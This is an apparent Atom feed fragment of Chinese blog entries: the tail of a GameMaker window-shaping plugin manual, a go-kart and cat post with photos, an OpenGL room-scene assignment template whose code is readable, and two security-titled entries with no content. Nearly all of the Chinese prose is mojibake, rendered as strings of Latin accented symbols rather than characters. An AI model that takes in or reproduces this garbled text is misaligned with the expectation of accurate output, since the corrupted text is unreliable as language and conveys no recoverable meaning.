<p>Áî±‰∫é GM ËøêË°åÂéüÁêÜÊâÄËá¥ÔºåÊ∏∏ÊàèÁªòÂà∂ÁöÑÂÜÖÂÆπÂπ∂‰∏ç‰ºöÂú®ÁªòÂà∂ËØ≠Âè•ÊâßË°åÁöÑÁû¨Èó¥ÊòæÁ§∫Âá∫Êù•ÔºåËÄåÊòØË¶ÅÁ≠âÂà∞ÂΩìÂâç Step ÊâÄÊúâÁªòÂà∂ÂÆåÊàêÂêéÊâç‰ºöÂà∑Êñ∞ÁªòÂà∂ÁºìÂ≠ò‰ª•ÊòæÁ§∫ÁªòÂà∂ÁöÑÂÜÖÂÆπ„ÄÇËøôÊÑèÂë≥ÁùÄÁ™óÂè£Â§ñÂΩ¢ÁöÑÊõ¥Êñ∞ÈúÄË¶Å‰∏éÁªòÂà∂ÂÜÖÂÆπÁöÑÂà∑Êñ∞ÂêåÊ≠•ÂèëÁîüÔºåÂê¶ÂàôÂ∞±‰ºöÂèëÁîüÁ™óÂè£ÂΩ¢Áä∂‰∏éÊâÄÊòæÁ§∫ÂÜÖÂÆπÊúâÊâÄÂÅèÂ∑ÆÁöÑÈóÆÈ¢òÔºàÊØîÂ¶ÇÊ∏∏Êàè‰ªçÁÑ∂ÊòæÁ§∫ÁöÑÊòØ‰∏ä‰∏ÄÂ∏ßÁöÑÂÜÖÂÆπÔºå‰ΩÜÊòØÁ™óÂè£ÂΩ¢Áä∂Â∑≤ÁªèË¢´Ë£ÅÂâ™Êàê‰∫Ü‰∏ã‰∏ÄÂ∏ßÊâÄÈúÄÁöÑÂΩ¢Áä∂ÔºâÔºö</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" alt="" class="wp-image-669"/></a><figcaption> <br>ÁªòÂà∂ÂÜÖÂÆπ‰∏éÁ™óÂè£ÂΩ¢Áä∂Ê≤°ÊúâÂêåÊ≠•Êõ¥Êñ∞ </figcaption></figure></div>



<p>Áî±‰∫é Windows Á™óÂè£Â§ñÂΩ¢Êõ¥Êñ∞Êó∂Êú∫ÊâÄÈôêÔºåÊú¨Êèí‰ª∂ÈúÄË¶ÅÂú® GM ÁöÑÊØè‰∏™ Step ‰∏≠Ôºå‰∫éÊØè‰∏™ Step ÂºÄÂßã ÔºàBegin StepÔºâËá≥ Draw Á≥ªÂàó‰∫ã‰ª∂ÂºÄÂßã‰πãÂâçÂØπÁ™óÂè£ÂΩ¢Áä∂ËøõË°åÊõ¥Êñ∞Ôºå‰ª•‰øùËØÅÁ™óÂè£ÂΩ¢Áä∂ÁöÑÊõ¥Êñ∞‰∏éÁªòÂà∂ÂÜÖÂÆπÁöÑÊõ¥Êñ∞ËÉΩÂ§üÂêåÊ≠•ÂÆåÊàê„ÄÇÂ¶ÇÊûúÂú® Draw Á≥ªÂàó‰∫ã‰ª∂‰∏≠ËøõË°åÁ™óÂè£ÂΩ¢Áä∂ÁöÑ‰øÆÊîπÔºåÂàô‰ºöÂèëÁîüÁ™óÂè£ÂΩ¢Áä∂‰∏éÁªòÂà∂ÂÜÖÂÆπ‰∏çÂêåÊ≠•ÁöÑÈóÆÈ¢òÔºåËØ∑Âä°ÂøÖÊ≥®ÊÑè„ÄÇÂª∫ËÆÆÂú® End Step ‰∫ã‰ª∂‰πã‰∏≠Êõ¥Êñ∞Á™óÂè£ÂΩ¢Áä∂„ÄÇ</p>



<p>ÂÜçÊ¨°ÊèêÁ§∫ÔºåËØ∑<strong>‰∏çË¶Å</strong>Âú® Draw <strong>Á≥ªÂàó</strong>‰∫ã‰ª∂‰∏≠Êõ¥Êñ∞Á™óÂè£ÂΩ¢Áä∂ÔºÅÈô§Èùû‰Ω†ÂçÅÂàÜÊ∏ÖÊ•öÂèØËÉΩÂèëÁîüÁöÑÂêéÊûúÔºÅ</p>



<h3>2.4 Â§çÊùÇÈÅÆÁΩ©</h3>



<p>Â§öÊ¨°ÊâßË°å‰ª•‰∏ã‰ªªÊÑèÊ†∏ÂøÉÂáΩÊï∞Êù•ÊîπÂèòÁ™óÂè£ÂΩ¢Áä∂ÔºåÂàôÂêé‰∏ÄÊ¨°ÁöÑÈÅÆÁΩ©Â∞Ü‰ºöË¶ÜÁõñÂâç‰∏ÄÊ¨°ÁöÑÈÅÆÁΩ©Ôºå<strong>Âπ∂‰∏ç‰ºö</strong>‰∫íÁõ∏Âè†Âä†Ôºö</p>


<pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // ‰ªÖÈôê GMS
</pre>


<p>ËøôÊÑèÂë≥ÁùÄÂ¶ÇÊûúÊâÄÈúÄÁöÑÈÅÆÁΩ©ÊòØÁî±Â§ö‰∏™ÂÖÉÁ¥†ÁªÑÂêàËÄåÊàêÁöÑÂ§çÊùÇÂΩ¢Áä∂ÔºåÂàôÈúÄË¶ÅÂºÄÂèëËÄÖËá™Ë°åÂáÜÂ§áÂ•ΩÂ∑≤Áªè‰∫ãÂÖàÁªÑÂêàÂ•ΩÊâÄÊúâÂÖÉÁ¥†ÁöÑ<strong>ÂçïÂº†</strong> Sprite / Surface Áî®‰ΩúÂÆûÈôÖÁöÑÈÅÆÁΩ©„ÄÇ</p>



<p>‰∏æ‰æãÊù•ËØ¥ÔºåÂ¶ÇÊûú‰Ω†ÈúÄË¶ÅÂú®Â±èÂπï‰∏äÊòæÁ§∫‰∏§‰ΩçÂ•≥Áâõ‰ªîÔºåÈÇ£‰πà‰Ω†ÈúÄË¶ÅÂáÜÂ§áÂ¶Ç‰∏ãÁöÑ<strong>‰∏ÄÂº†</strong> Sprite / Surface ‰Ωú‰∏∫ÈÅÆÁΩ©Ôºö</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" alt="" class="wp-image-678" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/complex-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>Â§çÊùÇÈÅÆÁΩ©</figcaption></figure></div>



<p>ËøûÁª≠Ë∞ÉÁî®‰∏§Ê¨° NF_WS_ShaveWindow_* ÂáΩÊï∞Âπ∂‰∏çËÉΩÂÆûÁé∞Â¶Ç‰∏äÊâÄËø∞ÁöÑÈúÄÊ±Ç„ÄÇÂÅáËÆæÁ¨¨‰∏ÄÊ¨°‰º†ÂÖ•‰∫ÜÂ∑¶‰æßÁâõ‰ªîÁöÑÈÅÆÁΩ©ÔºåÁ¨¨‰∫åÊ¨°‰º†ÂÖ•‰∫ÜÂè≥‰æßÁöÑÈÅÆÁΩ©ÔºåÂàôÂè™ÊúâÂè≥‰æß‰ºöÊ≠£Â∏∏ÊòæÁ§∫Âá∫Êù•ÔºåËÄåÁ¨¨‰∏ÄÊ¨°ËÆæÁΩÆÁöÑÈÅÆÁΩ©‰ºöË¢´Ë¶ÜÁõñËÄåÂ§±Êïà„ÄÇ</p>



<hr class="wp-block-separator"/>



<h2>3. Â∏∏ËßÅÈóÆÈ¢ò</h2>



<ol><li>‰ΩøÁî® Sprite ÂÅöÈÅÆÁΩ©Êó∂Ë¶ÅÊ≥®ÊÑèÊâÄÁî® Sprite ÁöÑ xoffset Âíå yoffset„ÄÇ</li></ol>
<p><a rel="nofollow" href="https://www.noisyfox.io/foxwinshave2.html">FoxWinShave 2 ‰∏≠Êñá‰ΩøÁî®ÊâãÂÜå</a>ÔºåÈ¶ñÂèë‰∫é<a rel="nofollow" href="https://www.noisyfox.io">ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù</a>„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/</id>
        <title><![CDATA[Êô∫ËÉΩÂêàÁ∫¶ÊîªÂáªÈù¢ÂèäctfÂá∫È¢òÊåáÂçó]]></title>
        <updated>2019-01-03T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"/>
        <content type="text/html" src="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"><![CDATA[Êô∫ËÉΩÂêàÁ∫¶ÊîªÂáªÈù¢ÂèäctfÂá∫È¢òÊåáÂçó]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/</id>
        <title><![CDATA[Âç°‰∏ÅËΩ¶‰∏éÁå´]]></title>
        <updated>2018-11-25T13:28:17+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"><![CDATA[<p>Êú¨Êù•ÊâìÁÆóÊãøÁ∫∏ÂÅö‰∏™Êû∂Â≠êÊääÊâãÊú∫Âõ∫ÂÆöÂú®Â∏ΩÂ≠ê‰∏äÂÖ®Á®ãÊãçÊëÑ<br>ÁÑ∂ËÄåËøáÂºØÂäõÂ∫¶Â§™Â§ßÊâãÊú∫Â∑¶ÊôÉÂè≥ÊôÉÊúÄÂêéËøòÊòØÁî©‰∫ÜÂá∫Âéª<br>Â∞±ÊñáÂ≠óÂàÜ‰∫´‰∏Ä‰∏ã‰øäËà™Âç°‰∏ÅËΩ¶ÁöÑ‰ΩìÈ™åÂêß<br>‰∏äËΩ¶ÂêéÂ∑•‰Ωú‰∫∫ÂëòÂèëËΩ¶Âèë‰∫ÜÂ•ΩÂá†Ê¨°ÈÉΩÊ≤°ÂèëÁùÄÊúâÁÇπÂ∞èÂ∞¥Â∞¨<br>Á¨¨‰∏ÄËÑöÂê¨Âà∞Ê≤πÈó®È©¨ËææÁöÑËΩ∞È∏£Â£∞Á´ãÂàªÊúâÁßçÈ©æÈ©≠ÈáéÂÖΩÁöÑÊÑüËßâ<br>ÂÖà‰∏çÊÄ•Á¨¨‰∏ÄÂúàÊ®°‰ªøf1ÊöñËÉé<br>Âú®ËµõÈÅì‰∏äÂ∑¶Âè≥ÊëáÊëÜÈ≤®È±ºÂ∑°Ëà™<br>ÂÆ§ÂÜÖËµõÈÅìÈïøÂ∫¶ËæÉÁü≠‰ΩÜË∑ØÈù¢Âπ≥Êï¥ÂæóÁîöËá≥ÂèçÂÖâÂæàÈÄÇÂêàÊºÇÁßª<br>ËΩ¶Ë∫´ÂæàÁ®≥Âú∞ÊëáÂÆåÁ¨¨‰∏ÄÂúà<br>Á¨¨‰∫åÂúàÂºÄÂêØËøêÂä®Ê®°Âºè<br>ÂéüË∞ÖÊàëÊòØ‰∏™ÈîÆÁõòËΩ¶ÊâãÊ≤πÈó®Âè™‰ºöË∏©Âà∞Â∫ï<br>Âä†ÈÄüÊÑüË∂ÖÂº∫ÂÖ•Á¨¨‰∏Ä‰∏™ÂºØÂâçÈÄüÂ∫¶‰º∞ËÆ°Êúâ30Ëøà<br>ÂáèÈÄü Ë¥¥Ëæπ ÁåõÊâìÊñπÂêëÁõò Ê≤πÈó®Ë∏©Âà∞Â∫ï ÊñπÂêëÁõòÂèçÊâì<br>ÁªìÊûúÂ∑ÆÁÇπÈ£ò‰∫Ü180Â∫¶<br>‰ΩÜËøòÊòØ‰∏çÂèØÈÅøÂÖçÁöÑÊíû‰∫ÜË∑ØËæπËΩÆËÉé<br>ÁÜüÊÇâÊâãÊÑüÂêéÂ∞±ÊîæÂºÄ‰∫Ü<br>ËôΩÁÑ∂Âú∞ÊñπÂ∞è‰ΩÜÂºØÈÅìÁöÑÂ∏ÉÁΩÆÂæàÂêàÁêÜ<br>ÊºÇÁßªÊó∂skrskrskr~ÂæàÂà∫ÊøÄ~<br>Âä™ÂäõÂÖÖÂàÜÂà©Áî®ËµõÈÅìÊÑüËßâËá™Â∑±Ëµ∞Á∫øËøòÂèØ‰ª•~<br>Êàë‰∏∫ËΩ¶ÁãÇÔºÅÔºÅÔºÅ</p><hr><p>‰∏ÄÂπ¥ÂâçÁöÑ12ÊúàÔºåÂ§ßÂØùÊúâ‰∫∫‰ªéÁÅ´ÈîÖÂ∫óËÄÅÊùøÈÇ£ÈáåÊî∂‰∫ÜÂè™ÂπºÁå´Ôºå‰ªéÊ≠§ÂºÄÂßã‰∫ÜÊúâÁå´Èô™‰º¥ÁöÑÊó•Â≠ê„ÄÇ<br>Â¶Ç‰ªäÁå´Âí™Â∑≤Áªè‰∏çÂú®ÔºåË¥¥ÁÇπÁÖßÁâáÂíåËßÜÈ¢ëË°®Ëææ‰∏Ä‰∏ãÂØπÂÆÉÁöÑÊÉ≥Âøµ„ÄÇ</p><iframe src="//player.bilibili.com/player.html?aid=35436376&cid=62120907&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe><p><img src="https://qiniu.karlrixon.cn/blog/181106/l7Eakg44il.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/mFfbFG81B7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/dl7LHkc4mj.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/fI83g5gcDB.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/cd0Kmd8igj.png?imageslim" alt="mark"></p><p>ËøôÂº†Â•Ω‰∏ë233</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/d0LbeC0d43.png?imageslim" alt="mark"></p><p>Âè∞ÁÅØ‰∏ãÂ∞±ÈÄÇÂêàÊÄùËÄÉ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DHHk9LAKgf.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/J8L798EBda.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/Djem79cGa6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/2460HE0mfJ.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/EdCAhFh0Bh.png?imageslim" alt="mark"></p><p>Â∞ùËØïÊúÄËàíÊúçÁöÑÁù°Âßø„ÄÇ„ÄÇ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/EeDAkDB6bc.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/8cFBhjj9Ac.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HGJ0gIK2bI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/aE8bf81maD.png?imageslim" alt="mark"></p><p>ÊûïÁùÄÁÆóÊ≥ï‰π¶Áù°Ëßâ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DIbjJ6Cjhk.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/deAFbCe92G.png?imageslim" alt="mark"></p><p>ÊàëÊòØ0ÊéíÊç∑Ë±πQAQ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/0kghK3mdKE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HIdB16aLb7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/4BBIk4L2CE.png?imageslim" alt="mark"></p><p>‰∏ìÂøÉÁÇπÔºÅ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/jj036eiHGj.png?imageslim" alt="mark"></p><p>‰Ω†ÊÑÅÂï•</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bJ1iibhiCH.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DFLAIjKdjI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0alG7LB41h.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/h50ghHDb7a.png?imageslim" alt="mark"></p><p>ËøôÊòØËÄÅÈº†Âêó</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/7khdeha147.png?imageslim" alt="mark"></p><p>ËÄÅÈº†Â∞±ËøôÂë≥Ôºü</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/BD6H22j4Bi.png?imageslim" alt="mark"></p><p>‰Ω†È™óË∞ÅÂë¢</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bklELf1b5K.png?imageslim" alt="mark"></p><p>ÊÇüÁ©∫</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/Lb9162KEC6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0Ddb9CgJFb.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/m43dfK70cb.png?imageslim" alt="mark"></p><p>ÊÉ≥‰Ω†‰∫ÜÂñµ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/CHj5e6cEde.png?imageslim" alt="mark"></p>]]></content>
        <author>
            <name><![CDATA[KarlRixon‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/Todo-List/</id>
        <title><![CDATA[Todo List]]></title>
        <updated>2018-11-23T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/Todo-List/"/>
        <content type="text/html" src="https://doublemice.github.io/Todo-List/"><![CDATA[Todo List]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/The-road-to-linux-kernel-exploit/</id>
        <title><![CDATA[The Road To Linux Kernel Exploit]]></title>
        <updated>2018-11-22T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"/>
        <content type="text/html" src="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"><![CDATA[The Road To Linux Kernel Exploit]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/</id>
        <title><![CDATA[Á´ûÈÄüÊ∏∏ÊàèÂΩïÂ±èÂâ™Ëæë]]></title>
        <updated>2018-11-11T11:07:14+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=27825157&cid=48041818&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixon‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/</id>
        <title><![CDATA[OpenGLËÆæËÆ°Â∞èÂ±ãÂú∫ÊôØ]]></title>
        <updated>2018-11-11T11:06:00+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"><![CDATA[<h2 id="Grading-Scheme"><a href="#Grading-Scheme" class="headerlink" title="Grading Scheme"></a>Grading Scheme</h2><p>Your assignment will be graded by the following marking scheme:<br>Basic (80%)</p><ul><li>Planes (the left, right, and back walls, the ceiling and the floor)  10%</li><li>At least five different geometric primitives                  20%</li><li>At least five keyboard events (mouse event is optional)        15%</li><li>Object transformation animation (rotation, translating, scaling)  15%</li><li>General lighting control (different material properties setting)   20%</li></ul><p>Bonus (Up to 20%)</p><ul><li>Well-organized room                                       5%</li><li>Complex meaningful object constructed by different primitives      5%</li><li>Additional light (with different properties, on/off or transformation)  10%</li><li>Other creativities                                           10%</li></ul><p>Total                                                       100%<br>Note: No grade will be given if the program is incomplete.</p><h2 id="‰ª£Á†ÅÊ°ÜÊû∂Ëß£ËØª"><a href="#‰ª£Á†ÅÊ°ÜÊû∂Ëß£ËØª" class="headerlink" title="‰ª£Á†ÅÊ°ÜÊû∂Ëß£ËØª"></a>‰ª£Á†ÅÊ°ÜÊû∂Ëß£ËØª</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;GL/glut.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> GLdouble FRUSTDIM = <span class="number">100.0f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// All Setup For OpenGL Goes Here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glEnable(GL_DEPTH_TEST);</span><br><span class="line">glEnable(GL_LIGHTING);</span><br><span class="line">glEnable(GL_LIGHT0);</span><br><span class="line">glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// Here's Where We Do All The Drawing</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Place light source here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Draw walls and objects here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Add animation here</span></span><br><span class="line"></span><br><span class="line">glutSwapBuffers();</span><br><span class="line">glFlush();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reshape</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> h)</span> <span class="comment">// Resize the GL Window. w=width, h=height</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glViewport(<span class="number">0</span>, <span class="number">0</span>, (GLsizei) w, (GLsizei) h);</span><br><span class="line">glMatrixMode(GL_PROJECTION);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">glFrustum(-FRUSTDIM, FRUSTDIM, -FRUSTDIM, FRUSTDIM, <span class="number">320.</span>, <span class="number">640.</span>);</span><br><span class="line">glMatrixMode(GL_MODELVIEW);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">keyboard</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> key, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> <span class="comment">// Handle the keyboard events here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> (key) </span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span>'\<span class="number">033'</span>:<span class="comment">//press 'esc' to quit</span></span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">   <span class="comment">// Add keyboard control here</span></span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Initialization of GLUT Library */</span></span><br><span class="line">glutInit(&amp;argc, argv);</span><br><span class="line">glutInitDisplayMode(GLUT_RGBA|GLUT_DOUBLE|GLUT_DEPTH);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Create a window with title specified */</span></span><br><span class="line">glutCreateWindow(<span class="string">"Assignment 1"</span>);</span><br><span class="line">glutInitWindowSize(<span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">glutInitWindowPosition(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">init();<span class="comment">/*not GLUT call, initialize several parameters */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Register different CALLBACK function for GLUT to response </span></span><br><span class="line"><span class="comment">with different events, e.g. window sizing, mouse click or</span></span><br><span class="line"><span class="comment">keyboard stroke */</span></span><br><span class="line">glutReshapeFunc(reshape);</span><br><span class="line">glutDisplayFunc(display);</span><br><span class="line">glutKeyboardFunc(keyboard);</span><br><span class="line">glutIdleFunc(idle);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Enter the GLUT event processing loop which never returns.</span></span><br><span class="line"><span class="comment">it will call different registered CALLBACK according</span></span><br><span class="line"><span class="comment">to different events. */</span></span><br><span class="line">glutMainLoop();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="‰øÆÊîπÂíåË°•ÂÖÖ"><a href="#‰øÆÊîπÂíåË°•ÂÖÖ" class="headerlink" title="‰øÆÊîπÂíåË°•ÂÖÖ"></a>‰øÆÊîπÂíåË°•ÂÖÖ</h2><p>‰Ωú‰∏öÊ°ÜÊû∂‰∏≠ÁöÑ‰∏ÄÂ§ÑbugÔºö<code>main</code>ÂáΩÊï∞‰∏≠<code>glutCreateWindow</code>Â∫îÂΩìÂú®<code>glutInitWindowSize</code>Âíå<code>glutInitWindowPosition</code>‰πãÂêé„ÄÇ</p><p>Âú®initÂáΩÊï∞‰∏≠Ê∑ªÂä†<code>glEnable(GL_NORMALIZE);</code>Ôºå<code>glEnable(GL_NORMALIZE)</code>ÊòØ‰Ωø<code>opengl</code>Ëá™Âä®normalize 